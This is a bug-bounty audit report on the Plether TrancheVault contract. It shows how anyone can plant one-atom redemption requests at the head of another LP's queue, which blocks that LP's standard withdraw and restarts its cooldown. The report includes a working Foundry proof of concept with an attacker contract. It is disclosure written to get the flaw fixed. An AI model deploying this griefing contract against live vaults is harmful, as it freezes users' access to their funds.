# \#97850 [SC-Low] Anyone can plant zero-value redemption requests at the head of another LP's queue, disabling its ERC-7540 withdraw until it accepts a cooldown

**Submitted on Nov 3rd 2026 at 15:08:17 UTC by @marcin37 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97850
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

`TrancheVault.requestRedeem` authenticates only the share owner, so anyone can open a one-atom redemption with another LP as controller. Settlement refunds the zero-value epoch, but the request stays at the head of that LP's queue, where the standard `maxWithdraw`, `maxRedeem`, `withdraw` and `redeem` stop working. Removing a head returns the atom and restarts the LP's one-hour cooldown. In the PoC, hourly gifts to three LPs over 24 hours cost 72 share atoms and hide a funded 249,337 USDG redemption; the LP needs 24 refund claims to withdraw it, which lock its remaining 249,337 USDG of shares for an hour.

## Root cause

[`requestRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L624-L630) checks the owner's allowance, never the controller's consent:

```solidity
_requireMinimumRedeemSize(shares, maxShares);
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);
requestId = _enqueueRedeemRequest(shares, controller);
```

A request for the owner's whole balance [skips the minimum size](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618), and with a [3-decimal share offset](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L279-L281) one atom quotes zero. Settlement then [refunds the epoch](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L960-L986) but only [removes it from the global queue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1505-L1524). [`withdraw`, `redeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012) and their [`max*` views](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1310) read only `controllerRedeemHead`, which now has nothing to claim. The head leaves the queue only through `cancelRedeemRequest` or [`claimRedeemRefund`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L942-L945), and both restart the controller's cooldown:

```solidity
if (shares != 0) {
    lastDepositTime[receiver] = block.timestamp; // receiver == controller
    _transfer(address(this), receiver, shares);
}
```

The interface requires reclaiming refundable heads before standard claims advance, and says receiver == controller means ["share delivery cannot impose another account's cooldown"](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L8-L14). Cecuro LOW-40 added that rule against cooldowns imposed on unrelated addresses, and [transfers](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L325-L331) pass on only an expired one. Both assume the controller opened the request. The sibling [`requestRedeemFromClaimableDeposit`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L650-L658) requires the controller or its operator, but `requestRedeem` lets any share owner open it.

Cecuro MED-24 is about zero-value epochs using up the global settlement work cap; here every epoch settles within its hour, and the harm sits in the victim's own queue.

## Attack path

Conditions: a live market, and hourly windows in which no one else redeems from the tranche.

1. The attacker keeps a small Junior position and gives its contract an allowance.
2. Each hour, for each target LP, the contract pulls one share atom and calls `requestRedeem(1, lp, self)`. For three LPs the transaction uses 752,500 gas.
3. Permissionless settlement refunds each gift epoch, and each refund stays at the head of the target's queue.
4. A target's later redemption is funded, but the standard claim views return 0 and the standard claims revert.
5. To restore them, the target calls `claimRedeemRefund` once per gift, and each call restarts its cooldown.

If another LP redeems in a gift's window, that gift is funded at zero assets and `redeem` can clear it; the attacker's other gifts still block.

## Impact

**Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol).** For dust and gas, the attacker disables the advertised ERC-7540 claim path of any LP it chooses, and the documented recovery freezes that LP's shares:

| Victim LP | Control | Attack |
| --- | --- | --- |
| Refundable heads ahead of its request | 0 | 24 |
| `maxWithdraw`, USDG | 249,337.31 | 0 |
| Paid by `withdraw`, USDG | 249,337.31 | 0 (reverts) |
| Refund claims before `withdraw` works | 0 | 24 |
| Remaining shares locked afterwards | none | 249,337.31 USDG for 3,600 s |

Only the controller or its operator can remove them, and each removal restarts its cooldown. The attacker adds one per window, so an LP that redeems after 30 days faces about 720 (extrapolated). The explicit-id `claimRedeem` still pays without a cooldown, so no cash is lost. A controller contract that uses only the standard claims and sets no operator cannot reach its funded cash at all.

## Recommendation

Require `msg.sender` to be the controller or its operator when the controller differs from the owner, or let the standard claims skip refundable heads. With that fix, the PoC's attack should leave `maxWithdraw` equal to the control.


## Proof of Concept

Runs in the competition repository at `a82d4fe` on its `BasePerpTest` fixture (in-scope contracts, mock USDG and Pyth). `setUp` enters 14M USDG Senior, 6M Junior, two more Junior LPs and the attacker's 1,000 USDG, and asserts that one share atom quotes zero USDG.

Both runs last 24 hours: an honest LP deposits every hour and a keeper settles each epoch. In the attack, the attacker's contract also requests one share atom per hour with each of three LPs as controller. One of them then redeems half its shares; the runs compare its standard `withdraw`, the `claimRedeemRefund` cleanup and its cooldown.

Cheatcodes: `vm.snapshotState`/`vm.revertToState` between runs, `vm.warp` for time, `vm.prank` for each account's own calls; mock USDG is minted. The fixture's owner sets the timelocked Senior cap, and its deposits install the 1.00 mark through the router address in place of a Pyth update. No position is open, so `settleLpEpoch` is called directly.

## Run

Foundry 1.7.1, with forge-std from the repository's submodule. The first via-IR compile takes about 90 seconds.

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
# save the code below as packages/perps/test/perps/poc/UnsolicitedRedeemHead.t.sol
FOUNDRY_TEST=test/perps/poc forge test --root packages/perps --match-path test/perps/poc/UnsolicitedRedeemHead.t.sol -vv
```

## Output

```text
Ran 1 test for test/perps/poc/UnsolicitedRedeemHead.t.sol:UnsolicitedRedeemHeadTest
[PASS] test_UnsolicitedZeroValueRequestsBlockStandardClaims() (gas: 42732203)
Logs:
  LPs gifted per transaction: 3
  Gas of one hourly gift transaction: 752500
  Share atoms spent by the attacker: 72
  Quote of one share atom, USDG: 0.000000
  Victim redemption funded, USDG: 249337.314603
  Refundable heads ahead of the victim's request, control / attacked: 0 24
  maxWithdraw, USDG, control / attacked: 249337.314603 0.000000
  maxRedeem, shares, control / attacked: 250177.264018423 0.000000000
  Paid by standard withdraw, USDG, control / attacked: 249337.314603 0.000000
  Attacked: claimRedeemRefund calls before withdraw works: 24
  Attacked: paid by withdraw after them, USDG: 249337.314603
  Victim wallet locked after claiming, seconds, control / attacked: 0 3600
  Locked remaining shares, USDG quote, control / attacked: 0.000000 249337.314604
  Attacked: refundable heads in another gifted LP's queue: 24
```

## Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @notice For 24 hours an attacker requests the redemption of one share atom per hour with three Junior LPs as
///         controllers, while an honest LP deposits every hour and a keeper settles each epoch. One gifted LP then
///         redeems half its shares. Control: no gifts, the LP claims its funded cash with the standard ERC-7540
///         withdraw and can request again at once.
contract UnsolicitedRedeemHeadTest is BasePerpTest {

    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant JUNIOR_LP = address(0x1A01);
    address internal constant SMALL_LP = address(0x1A02);
    address internal constant VICTIM = address(0x1A03);
    address internal constant DEPOSITOR = address(0x1A04);
    address internal constant ATTACKER = address(0xA77);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant INCUMBENT_SENIOR = 14_000_000e6;
    uint256 internal constant INCUMBENT_JUNIOR = 6_000_000e6;
    uint256 internal constant SMALL_LP_DEPOSIT = 10_000e6;
    uint256 internal constant VICTIM_DEPOSIT = 500_000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 1000e6; // the attacker's own Junior position
    uint256 internal constant HOURLY_DEPOSIT = 1000e6; // honest activity, the same in both runs
    uint256 internal constant START = 1_710_201_600; // Tue 2024-03-12 00:00 UTC, live market
    uint256 internal constant GIFT_HOURS = 24; // one gift per hourly request window

    struct Outcome {
        uint256 giftGas;
        uint256 headsAhead;
        uint256 funded;
        uint256 maxWithdraw;
        uint256 maxRedeem;
        uint256 paidByStandardClaim;
        uint256 cleanups;
        uint256 paidAfterCleanup;
        uint256 lockedFor;
        uint256 lockedValue;
        uint256 otherLpHeads;
    }

    Gifter internal gifter;
    uint256[] internal giftIds;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(JUNIOR_LP, INCUMBENT_JUNIOR);
        _fundSenior(SENIOR_LP, INCUMBENT_SENIOR);
        _fundJunior(SMALL_LP, SMALL_LP_DEPOSIT);
        _fundJunior(VICTIM, VICTIM_DEPOSIT);
        _fundJunior(ATTACKER, ATTACKER_DEPOSIT);

        vm.startPrank(ATTACKER);
        gifter = new Gifter(juniorVault);
        juniorVault.approve(address(gifter), type(uint256).max);
        vm.stopPrank();

        assertLt(block.timestamp, START);
        assertTrue(pool.isTradingActive());
        assertEq(juniorVault.estimateRedeemAssets(1), 0, "one share atom quotes zero USDG");
        assertGt(pool.minTrancheDepositAssets(), 0, "partial requests need a minimum, full-balance ones do not");
    }

    function test_UnsolicitedZeroValueRequestsBlockStandardClaims() public {
        uint256 requestShares = juniorVault.balanceOf(VICTIM) / 2;

        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _run(false, requestShares);
        vm.revertToState(snapshot);
        Outcome memory attacked = _run(true, requestShares);

        emit log_named_uint("LPs gifted per transaction", 3);
        emit log_named_uint("Gas of one hourly gift transaction", attacked.giftGas);
        emit log_named_uint("Share atoms spent by the attacker", 3 * GIFT_HOURS);
        emit log_named_decimal_uint("Quote of one share atom, USDG", juniorVault.estimateRedeemAssets(1), 6);
        emit log_named_decimal_uint("Victim redemption funded, USDG", attacked.funded, 6);
        emit log_named_string(
            "Refundable heads ahead of the victim's request, control / attacked",
            string.concat(vm.toString(control.headsAhead), " ", vm.toString(attacked.headsAhead))
        );
        _logPair("maxWithdraw, USDG, control / attacked", control.maxWithdraw, attacked.maxWithdraw, 6);
        _logPair("maxRedeem, shares, control / attacked", control.maxRedeem, attacked.maxRedeem, 9);
        _logPair(
            "Paid by standard withdraw, USDG, control / attacked",
            control.paidByStandardClaim,
            attacked.paidByStandardClaim,
            6
        );
        emit log_named_uint("Attacked: claimRedeemRefund calls before withdraw works", attacked.cleanups);
        emit log_named_decimal_uint("Attacked: paid by withdraw after them, USDG", attacked.paidAfterCleanup, 6);
        emit log_named_string(
            "Victim wallet locked after claiming, seconds, control / attacked",
            string.concat(vm.toString(control.lockedFor), " ", vm.toString(attacked.lockedFor))
        );
        _logPair(
            "Locked remaining shares, USDG quote, control / attacked", control.lockedValue, attacked.lockedValue, 6
        );
        emit log_named_uint("Attacked: refundable heads in another gifted LP's queue", attacked.otherLpHeads);

        assertEq(control.headsAhead, 0);
        assertEq(control.maxWithdraw, control.funded, "control: standard claim sees the funded cash");
        assertEq(control.paidByStandardClaim, control.funded);
        assertEq(control.lockedFor, 0, "control: the victim can request again at once");
        assertEq(control.lockedValue, 0);

        assertEq(attacked.funded, control.funded, "the victim's redemption is funded the same");
        assertEq(attacked.headsAhead, GIFT_HOURS);
        assertEq(attacked.maxWithdraw, 0, "attacked: standard claim views show nothing");
        assertEq(attacked.maxRedeem, 0);
        assertEq(attacked.paidByStandardClaim, 0);
        assertEq(attacked.cleanups, GIFT_HOURS, "one refund claim per gift");
        assertEq(attacked.paidAfterCleanup, control.funded);
        assertEq(attacked.lockedFor, juniorVault.DEPOSIT_COOLDOWN(), "the cleanup restarts the victim's cooldown");
        assertGt(attacked.lockedValue, 0, "the victim's whole remaining balance is locked");
        assertEq(attacked.otherLpHeads, GIFT_HOURS);
    }

    function _run(
        bool attack,
        uint256 requestShares
    ) internal returns (Outcome memory out) {
        address[] memory lps = new address[](3);
        lps[0] = VICTIM;
        lps[1] = JUNIOR_LP;
        lps[2] = SMALL_LP;

        // Each hour at hh:05 the keeper settles the matured epoch, then the honest LP and the attacker request.
        for (uint256 h; h < GIFT_HOURS; ++h) {
            vm.warp(START + h * 1 hours + 5 minutes);
            if (h > 0) {
                _keeperSettle();
            }
            _honestDeposit();
            if (attack) {
                vm.prank(ATTACKER);
                uint256 gasBefore = gasleft();
                uint256 giftId = gifter.gift(lps);
                if (h == 0) {
                    out.giftGas = gasBefore - gasleft();
                }
                giftIds.push(giftId);
            }
        }
        vm.warp(START + GIFT_HOURS * 1 hours + 5 minutes);
        _keeperSettle();
        out.headsAhead = _refundableHeads(VICTIM);
        out.otherLpHeads = _refundableHeads(JUNIOR_LP);

        vm.prank(VICTIM);
        uint256 requestId = juniorVault.requestRedeem(requestShares, VICTIM, VICTIM);
        vm.warp(pool.lpEpochStart(requestId));
        _keeperSettle();
        out.funded = juniorVault.claimableRedeemAssets(requestId, VICTIM);
        assertGt(out.funded, 0, "the victim's redemption is funded");

        out.maxWithdraw = juniorVault.maxWithdraw(VICTIM);
        out.maxRedeem = juniorVault.maxRedeem(VICTIM);
        if (out.maxWithdraw > 0) {
            out.paidByStandardClaim = _withdraw(out.maxWithdraw);
        } else {
            vm.prank(VICTIM);
            vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, VICTIM, out.funded, 0));
            juniorVault.withdraw(out.funded, VICTIM, VICTIM);
            vm.prank(VICTIM);
            vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, requestShares, 0));
            juniorVault.redeem(requestShares, VICTIM, VICTIM);

            // The documented way to advance the standard claim: reclaim every refundable head first.
            uint256 head = juniorVault.controllerRedeemHead(VICTIM);
            while (juniorVault.redeemRefundPending(head, VICTIM)) {
                vm.prank(VICTIM);
                juniorVault.claimRedeemRefund(head, VICTIM, VICTIM);
                ++out.cleanups;
                head = juniorVault.controllerRedeemHead(VICTIM);
            }
            out.paidAfterCleanup = _withdraw(juniorVault.maxWithdraw(VICTIM));
        }

        uint256 unlock = juniorVault.lastDepositTime(VICTIM) + juniorVault.DEPOSIT_COOLDOWN();
        out.lockedFor = unlock > block.timestamp ? unlock - block.timestamp : 0;
        uint256 remaining = juniorVault.balanceOf(VICTIM);
        if (out.lockedFor != 0) {
            out.lockedValue = juniorVault.estimateRedeemAssets(remaining);
        }
        if (out.lockedFor == 0) {
            vm.prank(VICTIM);
            juniorVault.requestRedeem(remaining, VICTIM, VICTIM);
        } else {
            vm.prank(VICTIM);
            vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
            juniorVault.requestRedeem(remaining, VICTIM, VICTIM);
            vm.prank(VICTIM);
            vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
            juniorVault.transfer(SMALL_LP, remaining);
        }
    }

    function _withdraw(
        uint256 assets
    ) internal returns (uint256 received) {
        uint256 balanceBefore = settlementToken.balanceOf(VICTIM);
        vm.prank(VICTIM);
        juniorVault.withdraw(assets, VICTIM, VICTIM);
        received = settlementToken.balanceOf(VICTIM) - balanceBefore;
    }

    function _honestDeposit() internal {
        settlementToken.mint(DEPOSITOR, HOURLY_DEPOSIT);
        vm.startPrank(DEPOSITOR);
        settlementToken.approve(address(juniorVault), HOURLY_DEPOSIT);
        juniorVault.requestDeposit(HOURLY_DEPOSIT, DEPOSITOR, DEPOSITOR);
        vm.stopPrank();
    }

    function _keeperSettle() internal {
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0);
    }

    function _refundableHeads(
        address lp
    ) internal view returns (uint256 count) {
        for (uint256 i; i < giftIds.length; ++i) {
            if (juniorVault.redeemRefundPending(giftIds[i], lp)) {
                ++count;
            }
        }
    }

    function _logPair(
        string memory label,
        uint256 a,
        uint256 b,
        uint256 decimals
    ) internal {
        emit log_named_string(label, string.concat(_decimal(a, decimals), " ", _decimal(b, decimals)));
    }

    function _decimal(
        uint256 value,
        uint256 decimals
    ) internal pure returns (string memory) {
        uint256 unit = 10 ** decimals;
        bytes memory fraction = bytes(vm.toString(value % unit + unit));
        bytes memory digits = new bytes(decimals);
        for (uint256 i; i < decimals; ++i) {
            digits[i] = fraction[i + 1];
        }
        return string.concat(vm.toString(value / unit), ".", string(digits));
    }

}

/// @notice The attacker's contract: moves one share atom from its owner and requests it for each controller.
contract Gifter {

    TrancheVault internal immutable VAULT;
    address internal immutable OWNER;

    constructor(
        TrancheVault vault
    ) {
        VAULT = vault;
        OWNER = msg.sender;
    }

    function gift(
        address[] calldata controllers
    ) external returns (uint256 requestId) {
        require(msg.sender == OWNER, "owner");
        for (uint256 i; i < controllers.length; ++i) {
            VAULT.transferFrom(OWNER, address(this), 1);
            requestId = VAULT.requestRedeem(1, controllers[i], address(this));
        }
    }

}
```

